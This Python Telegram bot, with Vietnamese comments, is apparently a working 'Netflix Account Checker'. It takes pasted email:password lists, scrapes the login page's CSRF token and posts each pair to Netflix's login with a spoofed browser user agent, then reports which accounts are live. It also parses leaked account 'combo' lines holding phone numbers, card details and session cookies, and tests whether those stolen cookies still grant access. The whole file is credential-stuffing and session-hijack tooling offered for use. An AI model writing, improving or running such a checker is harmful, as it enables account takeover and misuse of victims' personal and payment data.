import os
import re
import time
import logging
import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CẤU HÌNH ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN chưa được đặt trong biến môi trường!")
    exit(1)

NETFLIX_LOGIN_URL = "https://www.netflix.com/vn/login"
NETFLIX_API_URL = "https://www.netflix.com/api/shakti/v4f72bc24/pathSets?viewportId=chromeSize"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ================== HÀM PARSE THÔNG TIN TÀI KHOẢN ==================
def parse_account_info(text: str) -> dict:
    """
    Parse thông tin tài khoản từ text.
    Format: email:password | Country = XX | PLAN = xxx | COST = $xxx | STREAMS = x | BILLING_DATE = xxx | PAYMENT_METHOD = xxx | Cookie = ...
    """
    result = {
        "email": "",
        "password": "",
        "country": "",
        "plan": "",
        "cost": "",
        "streams": "",
        "billing_date": "",
        "payment_method": "",
        "cookie": "",
        "member_plan": "",
        "user_on_hold": "",
        "membership_status": "",
        "max_streams": "",
        "video_quality": "",
        "connected_profiles": "",
        "has_extra_member": "",
        "phone_number": "",
        "email_verified": "",
        "member_since": "",
        "next_billing_date": "",
        "last4": "",
        "total_cc": "",
        "cc": ""
    }

    try:
        # Tách phần email:password
        if "|" in text:
            email_pass = text.split("|")[0].strip()
            if ":" in email_pass:
                email, password = email_pass.split(":", 1)
                result["email"] = email.strip()
                result["password"] = password.strip()

        # Parse các trường còn lại
        patterns = {
            "country": r"Country\s*=\s*([^\|]+?)(?:\s*\|)",
            "plan": r"PLAN\s*=\s*([^\|]+?)(?:\s*\|)",
            "cost": r"COST\s*=\s*([^\|]+?)(?:\s*\|)",
            "streams": r"STREAMS\s*=\s*([^\|]+?)(?:\s*\|)",
            "billing_date": r"BILLING_DATE\s*=\s*([^\|]+?)(?:\s*\|)",
            "payment_method": r"PAYMENT_METHOD\s*=\s*([^\|]+?)(?:\s*\|)",
            "cookie": r"Cookie\s*=\s*(.+?)(?:\s*\|[\w\s]*=|$)",
            "member_plan": r"memberPlan\s*=\s*([^\|]+?)(?:\s*\|)",
            "user_on_hold": r"UserOnHold\s*=\s*([^\|]+?)(?:\s*\|)",
            "membership_status": r"membershipStatus\s*=\s*([^\|]+?)(?:\s*\|)",
            "max_streams": r"maxStreams\s*=\s*([^\|]+?)(?:\s*\|)",
            "video_quality": r"videoQuality\s*=\s*([^\|]+?)(?:\s*\|)",
            "connected_profiles": r"connetedProfiles\s*=\s*([^\|]+?)(?:\s*\|)",
            "has_extra_member": r"hasExtraMember\s*=\s*([^\|]+?)(?:\s*\|)",
            "phone_number": r"phoneNumber\s*=\s*([^\|]+?)(?:\s*\|)",
            "email_verified": r"emailVerified\s*=\s*([^\|]+?)(?:\s*\|)",
            "member_since": r"memberSince\s*=\s*([^\|]+?)(?:\s*\|)",
            "next_billing_date": r"NextBillingDate\s*=\s*([^\|]+?)(?:\s*\|)",
            "last4": r"last4\s*=\s*\[([^\]]+)\](?:\s*\|)",
            "total_cc": r"TotalCC\s*=\s*([^\|]+?)(?:\s*\|)",
            "cc": r"CC\s*=\s*\[([^\]]+)\](?:\s*\|)"
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                result[key] = match.group(1).strip()

    except Exception as e:
        logger.error(f"Lỗi parse: {e}")

    return result


# ================== HÀM KIỂM TRA COOKIE ==================
def check_cookie_validity(cookie_str: str) -> dict:
    """
    Kiểm tra cookie có còn hoạt động không.
    Trả về dict với keys: valid (bool), reason (str)
    """
    if not cookie_str:
        return {"valid": False, "reason": "KHONG_CO_COOKIE"}

    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }

    try:
        # Parse cookie string thành dict
        cookies = {}
        for part in cookie_str.split(";"):
            if "=" in part:
                key, val = part.strip().split("=", 1)
                cookies[key] = val

        if not cookies:
            return {"valid": False, "reason": "COOKIE_KHONG_HOP_LE"}

        # Thử API 1 - profile list
        resp = session.get(
            "https://www.netflix.com/api/shakti/v4f72bc24/profileNavigation",
            headers=headers,
            cookies=cookies,
            timeout=10
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if "profiles" in data:
                    # Kiem tra neu co profiles thi cookie con hoat dong
                    return {"valid": True, "reason": "COOKIE_HOAT_DONG"}
            except:
                pass

        # Thử API 2 - browse page
        resp2 = session.get(
            "https://www.netflix.com/browse",
            headers=headers,
            cookies=cookies,
            timeout=10,
            allow_redirects=False
        )

        if resp2.status_code == 200 and "browse" in resp2.url:
            return {"valid": True, "reason": "COOKIE_HOAT_DONG"}

        # Kiem tra neu redirect ve login thi cookie het hieu luc
        if resp.status_code in [302, 303, 307, 308] or "login" in resp.url:
            return {"valid": False, "reason": "COOKIE_HET_HIEU_LUC"}

        return {"valid": False, "reason": "COOKIE_KHONG_XAC_DINH"}

    except Exception as e:
        logger.warning(f"Lỗi kiểm tra cookie: {e}")
        return {"valid": False, "reason": f"LOI: {str(e)}"}


# ================== HÀM FORMAT KẾT QUẢ ==================
def format_account_result(info: dict, cookie_result: dict) -> str:
    """
    Format thông tin tài khoản thành chuỗi đẹp.
    """
    cookie_valid = cookie_result.get("valid", False)
    cookie_reason = cookie_result.get("reason", "")

    if cookie_valid:
        status = "HOAT DONG"
    else:
        # Map reason to Vietnamese
        reason_map = {
            "COOKIE_HET_HIEU_LUC": "HET HIEU LUC",
            "KHONG_CO_COOKIE": "KHONG CO COOKIE",
            "COOKIE_KHONG_HOP_LE": "COOKIE KHONG HOP LE",
            "COOKIE_KHONG_XAC_DINH": "KHONG XAC DINH"
        }
        status = reason_map.get(cookie_reason, "KHONG XAC DINH")

    result = f"""
📧 Email: {info['email']}
🔑 Password: {info['password']}
━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: {info['country']}
📦 Plan: {info['plan']}
💰 Cost: {info['cost']}
🎬 Streams: {info['streams']}
📅 Billing Date: {info['billing_date']}
💳 Payment: {info['payment_method']}
━━━━━━━━━━━━━━━━━━━━━━━━
🔐 Member Plan: {info['member_plan']}
⚠️ User On Hold: {info['user_on_hold']}
📊 Status: {info['membership_status']}
🎥 Max Streams: {info['max_streams']}
🖥️ Video Quality: {info['video_quality']}
👥 Profiles: {info['connected_profiles']}
➕ Extra Member: {info['has_extra_member']}
📱 Phone: {info['phone_number']}
✅ Email Verified: {info['email_verified']}
📆 Member Since: {info['member_since']}
🔄 Next Billing: {info['next_billing_date']}
💳 Card: {info['cc']}
━━━━━━━━━━━━━━━━━━━━━━━━
🍪 Cookie: {cookie_reason}
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 TRANG THAI: {status}
"""
    return result.strip()

# ================== HÀM KIỂM TRA BẰNG REQUESTS ==================
def check_with_requests(email: str, password: str) -> dict:
    """
    Thử đăng nhập bằng requests.
    Trả về dict với keys: valid (bool), reason (str)
    """
    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.netflix.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # 1. Lấy trang login để lấy CSRF token
        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"[Requests] Không thể truy cập trang login: {resp.status_code}")
            return {"valid": False, "reason": "LOI_TRUY_CAP"}

        # Tìm token trong HTML
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        csrf_token = match.group(1) if match else ""

        # 2. Gửi POST đăng nhập
        login_payload = {
            "userLoginId": email,
            "password": password,
            "csrf_token": csrf_token,
            "rememberMe": "true",
            "flow": "websiteSignup",
            "mode": "login",
            "action": "loginAction",
        }
        login_resp = session.post(
            NETFLIX_LOGIN_URL,
            data=login_payload,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )

        # Lấy response text để parse lỗi
        resp_text = login_resp.text.lower()

        # Kiểm tra các lỗi cụ thể
        if "incorrect password" in resp_text or "mat khau khong dung" in resp_text:
            return {"valid": False, "reason": "SAI_MAT_KHAU"}

        if "we're sorry" in resp_text or "khong tim thay tai khoan" in resp_text:
            return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI"}

        if "your account is on hold" in resp_text or "tai khoan bi tam dung" in resp_text:
            return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM"}

        if "payment" in resp_text and ("issue" in resp_text or "problem" in resp_text):
            return {"valid": False, "reason": "LOI_THANH_TOAN"}

        if "expired" in resp_text or "het han" in resp_text:
            return {"valid": False, "reason": "TAI_KHOAN_HET_HAN"}

        # Nếu server trả về 302 (redirect) -> đăng nhập thành công
        if login_resp.status_code == 302 and "Set-Cookie" in login_resp.headers:
            # Thử truy cập trang browse để xác nhận
            browse_resp = session.get(
                "https://www.netflix.com/browse",
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            if browse_resp.status_code == 200 and "browse" in browse_resp.url:
                logger.info(f"[Requests] Thành công: {email}")
                return {"valid": True, "reason": "DANG_NHAP_THANH_CONG"}

        return {"valid": False, "reason": "KHONG_XAC_DINH"}

    except Exception as e:
        logger.warning(f"[Requests] Lỗi: {e}")
        return {"valid": False, "reason": f"LOI_HE_THONG: {str(e)}"}

# ================== HÀM KIỂM TRA TỔNG HỢP ==================
async def check_account(email: str, password: str) -> str:
    """
    Kiểm tra một tài khoản bằng requests.
    Trả về chuỗi kết quả với lý do cụ thể.
    """
    logger.info(f"Đang kiểm tra: {email}")
    result = check_with_requests(email, password)

    if result["valid"]:
        return f"✅ {email}:{password} | HOAT DONG | {result['reason']}"
    else:
        reason_map = {
            "SAI_MAT_KHAU": "SAI_MAT_KHAU",
            "TAI_KHOAN_KHONG_TON_TAI": "TAI_KHOAN_KHONG_TON_TAI",
            "TAI_KHOAN_BI_KHOA_TAM": "BI_TAM_KHOA_(ON_HOLD)",
            "LOI_THANH_TOAN": "LOI_THANH_TOAN",
            "TAI_KHOAN_HET_HAN": "HET_HAN",
            "KHONG_XAC_DINH": "KHONG_XAC_DINH",
            "LOI_TRUY_CAP": "LOI_TRUY_CAP"
        }
        reason_text = reason_map.get(result["reason"], result["reason"])
        return f"❌ {email}:{password} | {reason_text}"

# ================== XỬ LÝ TELEGRAM BOT ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Netflix Account Checker\n\n"
        "Cach 1 (dang cu - kiem tra mat khau):\n"
        "email1:password1\n\n"
        "Cach 2 (format day du - kiem tra cookie):\n"
        "email:password | Country = XX | PLAN = ... | Cookie = ...\n\n"
        "Tra cu: SAI_MAT_KHAU | BI_TAM_KHOA | LOI_THANH_TOAN | HET_HAN | HOAT_DONG"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("Vui long gui danh sach tai khoan.")
        return

    lines = text.splitlines()
    accounts = []
    parsed_accounts = []

    for line in lines:
        line = line.strip()
        if not line:
            continue

        # Kiem tra neu la format moi co |
        if "|" in line and ":" in line.split("|")[0]:
            # Parse format moi
            info = parse_account_info(line)
            if info['email'] and info['password']:
                parsed_accounts.append(info)
        elif ':' in line:
            # Format cu email:password
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))

    # Xu ly format cu
    if accounts:
        await update.message.reply_text(f"Dang kiem tra {len(accounts)} tai khoan (dang cu)...")

        for email, password in accounts:
            result = await check_account(email, password)
            await update.message.reply_text(result)
            await asyncio.sleep(1)

    # Xu ly format moi
    if parsed_accounts:
        await update.message.reply_text(f"Dang phan tich {len(parsed_accounts)} tai khoan (format moi)...")

        for info in parsed_accounts:
            # Kiem tra cookie
            cookie_result = check_cookie_validity(info['cookie']) if info['cookie'] else {"valid": False, "reason": "KHONG_CO_COOKIE"}

            # Format ket qua
            result = format_account_result(info, cookie_result)
            await update.message.reply_text(result)
            await asyncio.sleep(1)

    if not accounts and not parsed_accounts:
        await update.message.reply_text("Khong tim thay tai khoan hop le nao.")
        return

    await update.message.reply_text(f"Hoan thanh!")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()